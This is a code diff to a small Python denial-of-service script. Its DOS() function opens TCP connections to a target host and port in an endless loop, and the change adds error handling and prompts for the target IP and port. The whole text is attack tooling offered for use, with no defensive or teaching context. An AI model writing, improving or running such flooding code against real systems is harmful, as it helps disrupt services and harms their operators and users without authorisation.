@@ -7,17 +7,23 @@ import sys
 def DOS(host,port):		
 	
 	while True:
-		computer = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		
+		try:
+			computer = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 			
-		conn= computer.connect((host,port))
-		if (not conn):
-			print('sending dos packets')
-		else:
-			print('port not open')
-			break
-			
-		computer.close()
+			conn= computer.connect((host,port))
+			if (not conn):
+				print('sending dos packets')
+			else:
+				print('port not open')
+				break
 
+			computer.close()
+		except:
+			print("invalid host or Host is down...")
+
+host = input("Host IP: ")
+port = int(input("Port: "))
 
 DOS(host,port)
 
